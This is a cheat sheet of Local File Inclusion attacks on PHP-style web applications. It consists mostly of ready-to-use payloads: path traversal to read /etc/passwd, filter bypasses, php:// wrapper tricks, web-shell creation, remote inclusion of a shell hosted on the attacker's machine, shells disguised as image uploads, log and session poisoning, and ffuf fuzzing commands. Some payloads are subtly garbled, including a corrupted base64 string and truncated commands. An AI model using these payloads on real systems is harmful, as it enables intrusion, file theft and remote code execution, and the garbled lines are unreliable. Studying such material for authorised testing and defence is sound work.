# Local File Inclusion (LFI) — Cheat Sheet

## Understanding Local File Inclusion (LFI)
Web applications sometimes load pages dynamically using a parameter in the URL.  
Example: http://www.example-site.com/index.php?page=about  

The application may include the file about.php from the server — but if the parameter is not sanitized, an attacker could change the value and force the server to load other files, such as sensitive system files:  
http://www.example-site.com/index.php?page=../../../../etc/passwd  

This is the core of Local File Inclusion (LFI) — manipulating file paths to read or execute files on the server.

## Types of LFI Attacks
| Type | Description |
|------|---------|
| File DisclosureI | Attacker accesses files like /etc/passwd, configs, logs, backups, etc. |
| Code Execution | If file upload is possible, the attacker may include their own PHP code for RCE.|
| Log Poisoning	| Injecting PHP payloads into logs (e.g., via User-Agent) and including them to execute code.|
| Wrapper-Based Attacks |	PHP wrappers like php://input or php://filter used to bypass filters or encode payloads.|
| Chained Attacks |	LFI combined with other vulnerabilities (upload, SSRF, path traversal) to escalate impact.|


## Detection Techniques
- Try manual payload testing (../../../../../etc/passwd)  
- Use scanners: Burp Suite, OWASP ZAP, Nikto, wfuzz  
- Attempt log inclusion:  
../../../../var/log/apache2/access.log  
- Test for null byte injections (%00) — sometimes effective on legacy PHP versions  
- Observe error messages for directory structure leaks  

---

## Basic LFI Payloads

| Type | Example |
|------|---------|
| Basic LFI | `/index.php?language=/etc/passwd` |
| Path Traversal | `/index.php?language=..//etc/passwd` |
| With Prefix | `/index.php?language=/../../../etc/passwd` |
| Approved Path Bypass | `/index.php?language=./languages/../etc/passwd` |
| Path Traversal Filters | `index.php?language=..../...///..//etc/passwd` |  
| URL Encoding | `/index.php?language=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` |
| Path Truncation (Obsolete) | `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED 2048x]` |
| Null Byte Injection (Obsolete) | `/index.php?language=..//etc/passwd%00` |
| Read PHP with base64 filter | `/index.php?language=php://filter/read=convert.base64-encode/resource=config` |

After retrieving the result, decode it:
`echo 'BASE64_ENCODED_TEXT' | base64 -d`

Tip: Use **CyberChef** to encode payloads.  

---

## Remote Code Execution 

**PHP Wrappers**  
RCE with data wrapper:  
`/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR@VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`  
RCE with expect wrapper:  
`curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`  

**RFI**  
Host web shell:  
`echo '<?php system($_GET["cmd"]); ?>' >shell.php && python3 -m http.server<LISTENING_PORT>`  
Include remote PHP web shell:  
`/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`  

**LFI + Upload**  
Create malicious image:  
`echo 'GIF8<?php system($_GET["cmd"]); ?v' >shell.gif`  
RCE with malicious uploaded image:  
`/index.php?language=./profile_images/shell.gif&cmd=i`  
Create malicious zip archive 'as jpg':  
`echo '<?php system($_GET["cmd"]); ?>' >shell.php && zip shell.jpg shell.php`  
RCE with malicious uploaded zip:  
`/index.php?language=zip://shell.zip%23shell.php&cmd=id`  
Create malicious phar 'as jpg':  
`php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`  
RCE with malicious uploaded phar:  
`/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`  

**Log Poisoning**
Read PHP session parameters:  
`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`  
Poison PHP session with web shell:  
`/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`  
RCE through poisoned PHP session:  
`/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`  
Poison server log:  
`curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'`  
RCE through poisoned PHP session:  
`/index.php?language=/var/log/apache2/access.log&cmd=id`  

## Misc  
Fuzz page parameters:  
`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`  
Fuzz LFI payloads:  
`ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`  
Fuzz webroot path:  
`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`
Fuzz server configurations:   
`ffuf -w ./LFI-WordList-Linux: FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=.././FUZZ' -fs 2287`  

**LFI Wordlists**  
LFI-Jhaddix.txt  
Webroot path wordlist for Linux  
Webroot path wordlist for Windows  
Server configurations wordlist for Linux  
Server configurations wordlist for Windows  

## Misc
**PHP**  
include()/include_once()  
Read Content [Yes] - Execute [Yes] - Remote URL [Yes]  
require()/require_once()  
Read Content [Yes] - Execute [Yes] - Remote URL [No]  
file_get_contents()  
Read Content [Yes] - Execute [No] - Remote URL [Yes]  
fopen()/file()  
Read Content [Yes] - Execute [No] - Remote URL [No]  

**NodeJS**  
fs.readFile()  
Read Content [Yes] - Execute [No] - Remote URL [No]  
fs.sendFile()  
Read Content [Yes] - Execute [No] - Remote URL [No]  
res.render()  
Read Content [Yes] - Execute [Yes] - Remote URL [No]  

**Java**  
include  
Read Content [Yes] - Execute [No] - Remote URL [No]  
import  
Read Content [Yes] - Execute [Yes] - Remote URL [Yes]  

**.NET**  
@Html.Partial))  
Read Content [Yes] - Execute [No] - Remote URL [No]  
@Html.RemotePartial()  
Read Content [Yes] - Execute [No] - Remote URL [Yes]  
Response.WriteFile()  
Read Content [Yes] - Execute [No] - Remote URL [No]  
include  
Read Content [Yes] - Execute [Yes] - Remote URL [Yes]  




